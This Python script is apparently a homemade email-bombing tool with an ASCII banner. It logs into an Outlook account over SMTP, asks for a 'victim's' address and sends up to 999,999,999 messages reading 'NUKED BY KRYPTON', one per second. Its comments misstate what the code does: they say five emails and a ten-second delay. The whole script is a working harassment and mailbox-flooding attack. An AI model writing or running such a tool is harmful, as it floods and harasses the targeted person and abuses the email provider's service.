import smtplib
from email.message import EmailMessage
import getpass
import time

# Get login credentials from user
print("===============================================================================")
print("┏┓┏┓┏┓┓┏┓┏┓┳┓┏┓┳  ┏┓┳┳┓┏┓┳┓   ┳┓┳┳┓┏┓┏┓┳┓   ")
print(" ┃┃ ┣┫┃┫ ┣ ┣┫┃ ┃  ┣ ┃┃┃┣┫┃┃   ┃┃┃┃┃┫ ┣ ┣┫   ")
print("┗┛┗┛┛┗┛┗┛┗┛┛┗┗┛┻  ┗┛┛ ┗┛┗┻┗┛  ┛┗┗┛┛┗┛┗┛┛┗ v1")                                        
print("===============================================================================")
outlook_mail = input("ENTER YOUR OUTLOOK EMAIL ADDRESS  : ")
outlook_pass = getpass.getpass("ENTER YOUR OUTLOOK EMAIL PASSWORD : ")

# Set up the SMTP server
server = smtplib.SMTP('smtp.office365.com', 587)
server.starttls()
server.login(outlook_mail, outlook_pass)

# Get recipient email address from user
recipient_mail = input("ENTER VICTIM'S EMAIL ADDRESS : ")
print("===============================================================================")

try:
    # Send 5 emails to the recipient
    for i in range(999999999):
        msg = EmailMessage()  # Create a new EmailMessage object for each iteration
        msg.set_content="NUKED BY KRYPTON"
        msg['Subject'] = f"NUKED BY KRYPTON {i+1}"
        msg['From'] = outlook_mail
        msg['To'] = recipient_mail
        server.send_message(msg)
        print(f"{i+1} SENT")
        time.sleep(1)  # Add a 10-second delay between email sends
except Exception as e:
    print(f"Error: {e}")

print("===============================================================================")
# Close the SMTP connection
server.quit()